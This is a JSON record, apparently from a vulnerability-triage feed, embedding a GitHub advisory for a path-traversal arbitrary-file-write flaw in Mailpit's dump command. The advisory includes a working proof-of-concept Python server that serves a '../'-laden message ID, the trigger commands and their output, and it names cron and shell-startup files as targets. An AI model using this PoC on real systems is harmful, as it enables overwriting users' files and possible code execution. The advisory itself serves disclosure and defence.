@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/35239791?v=4\", \"events_url\": \"https://api.github.com/users/KadirArslan/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/KadirArslan/followers\", \"following_url\": \"https://api.github.com/users/KadirArslan/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/KadirArslan/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/KadirArslan\", \"id\": 35239791, \"login\": \"KadirArslan\", \"node_id\": \"MDQ6VXNlcjM1MjM5Nzkx\", \"organizations_url\": \"https://api.github.com/users/KadirArslan/orgs\", \"received_events_url\": \"https://api.github.com/users/KadirArslan/received_events\", \"repos_url\": \"https://api.github.com/users/KadirArslan/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/KadirArslan/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/KadirArslan/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/KadirArslan\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45711\", \"cvss\": {\"score\": 5.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-829\", \"name\": \"Inclusion of Functionality from Untrusted Control Sphere\"}], \"description\": \"### Summary\\nThe mailpit dump --http <base-url> <out-dir> sub-command downloads every message from a remote Mailpit instance and writes each one as <id>.eml inside the user-supplied output directory. The message ID field is taken verbatim from the JSON response of the remote server and concatenated into the output path with path.Join, which silently normalizes .. segments. A malicious HTTP server impersonating Mailpit can therefore make mailpit dump write attacker-controlled bytes to any path the running user can write, fully outside the intended output directory.\\n\\n### Details\\nAnyone who can convince a user to run mailpit dump --http <attacker-url> <dir> (typosquat, phishing tutorial, MITM of a plain-http:// Mailpit, or a compromised internal Mailpit they back up regularly) obtains an arbitrary file write primitive as the dumping user. Realistic post-exploitation includes overwriting init/cron files, shell startup files, CI artifact upload targets, web roots, etc. — anything the dumping user can write to, with attacker-controlled file bytes and a .eml filename suffix.\\n\\n### Affected code\\n[internal/dump/dump.go](https://github.com/axllent/mailpit/blob/develop/internal/dump/dump.go#L118-L155):\\n\\npath.Join(\\\"/safe/out/dir\\\", \\\"../../../../etc/cron.d/payload.eml\\\") resolves to /etc/cron.d/payload.eml — the .. segments are normalized, not rejected. The remote server controls both m.ID (path) and the body of /api/v1/message/<id>/raw (contents). There is no filepath.Rel(outDir, out) containment check, no allow-list on m.ID characters, and no body-size cap.\\n\\nThe underlying cause is that the command was added to back up a trusted Mailpit, but the trust model on the wire never gets validated — the operator only supplies a URL.\\n\\n### PoC\\n\\n1. Run a malicious \\\"Mailpit\\\" server that returns one message whose ID contains .. segments:\\n\\n```python\\n# evil-mailpit.py\\nimport http.server, json\\n\\nclass Evil(http.server.BaseHTTPRequestHandler):\\n    def do_GET(self):\\n        if \\\"/api/v1/messages\\\" in self.path:\\n            resp = {\\n                \\\"total\\\": 1, \\\"unread\\\": 0, \\\"count\\\": 1,\\n                \\\"messages_count\\\": 1, \\\"messages_unread\\\": 0,\\n                \\\"start\\\": 0, \\\"tags\\\": [],\\n                \\\"messages\\\": [{\\n                    \\\"ID\\\": \\\"../../../../tmp/mailpit-pwn\\\",          # ← traversal\\n                    \\\"MessageID\\\": \\\"x\\\", \\\"Read\\\": False,\\n                    \\\"From\\\": {\\\"Name\\\": \\\"\\\", \\\"Address\\\": \\\"a@b\\\"},\\n                    \\\"To\\\":   [{\\\"Name\\\": \\\"\\\", \\\"Address\\\": \\\"c@d\\\"}],\\n                    \\\"Cc\\\": None, \\\"Bcc\\\": None, \\\"ReplyTo\\\": [],\\n                    \\\"Subject\\\": \\\"evil\\\",\\n                    \\\"Created\\\": \\\"2026-01-01T00:00:00Z\\\",\\n                    \\\"Tags\\\": [], \\\"Size\\\": 5,\\n                    \\\"Attachments\\\": 0, \\\"Snippet\\\": \\\"\\\"\\n                }]\\n            }\\n            body = json.dumps(resp).encode()\\n            ctype = \\\"application/json\\\"\\n        elif \\\"/raw\\\" in self.path:\\n            body  = b\\\"PWNED BY MAILPIT DUMP TRAVERSAL\\\\n\\\"\\n            ctype = \\\"text/plain\\\"\\n        else:\\n            self.send_response(404); self.end_headers(); return\\n\\n        self.send_response(200)\\n        self.send_header(\\\"Content-Type\\\", ctype)\\n        self.send_header(\\\"Content-Length\\\", str(len(body)))\\n        self.end_headers()\\n        self.wfile.write(body)\\n\\nhttp.server.HTTPServer((\\\"127.0.0.1\\\", 19090), Evil).serve_forever()\\n```\\n\\n```\\n$ python3 evil-mailpit.py &\\n$ mkdir -p /tmp/dump-out\\n$ mailpit dump --http http://127.0.0.1:19090/ /tmp/dump-out\\n```\\n\\n2. Observe the file was written outside the requested output directory:\\n\\n```\\n$ ls -la /tmp/dump-out/ /tmp/mailpit-pwn.eml\\n/tmp/dump-out/                                        ← empty\\ntotal 0\\n-rw-r--r-- 1 user user 31 May 11 16:16 /tmp/mailpit-pwn.eml\\n$ cat /tmp/mailpit-pwn.eml\\nPWNED BY MAILPIT DUMP TRAVERSAL\\n```\\n\\nThe same primitive trivially targets ~/.config/autostart/*.eml, ~/.bash_logout.eml (where it overwrites if symlinked), CI artifact dirs that ingest every file, or via long ../ chains any absolute path the user can write to.\\n\\n### Impact\\nArbitrary file write via path traversal in mailpit dump --http, allowing a malicious Mailpit-compatible server to force writes outside the intended output directory. This can lead to overwriting sensitive files (e.g. cron jobs, CI artifacts, shell configs) and potential code execution depending on write location and privileges.\", \"epss\": {\"percentage\": 0.00032, \"percentile\": 0.09704}, \"ghsa_id\": \"GHSA-qx5x-85p8-vg4j\", \"github_reviewed_at\": \"2026-05-19T15:53:09Z\", \"html_url\": \"https://github.com/advisories/GHSA-qx5x-85p8-vg4j\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-qx5x-85p8-vg4j\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45711\"}], \"nvd_published_at\": null, \"published_at\": \"2026-05-19T15:53:09Z\", \"references\": [\"https://github.com/axllent/mailpit/security/advisories/GHSA-qx5x-85p8-vg4j\", \"https://github.com/axllent/mailpit/releases/tag/v1.30.0\", \"https://github.com/advisories/GHSA-qx5x-85p8-vg4j\"], \"repository_advisory_url\": \"https://api.github.com/repos/axllent/mailpit/security-advisories/GHSA-qx5x-85p8-vg4j\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/axllent/mailpit\", \"summary\": \"Mailpit: Path traversal & arbitrary file write in mailpit dump --http via attacker-controlled message IDs\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-19T15:53:13Z\", \"url\": \"https://api.github.com/advisories/GHSA-qx5x-85p8-vg4j\", \"vulnerabilities\": [{\"first_patched_version\": \"1.30.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/axllent/mailpit\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.30.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-qx5x-85p8-vg4j",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/axllent/mailpit: < 1.30.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-45711"
+    ],
+    "cvss_score": 5.9,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/axllent/mailpit"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:01.792492Z",
+  "provenance": {
+    "content_sha256": "b3df8e54c799c81db66b11a8fdbdea8e9ba8766c3cd71a26692a26f666c95d89",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-19T15:53:09Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-qx5x-85p8-vg4j",
+  "status": "active",
+  "title": "Mailpit: Path traversal & arbitrary file write in mailpit dump --http via attacker-controlled message IDs",
+  "updated_at": "2026-05-19T15:53:13Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-qx5x-85p8-vg4j"
+}
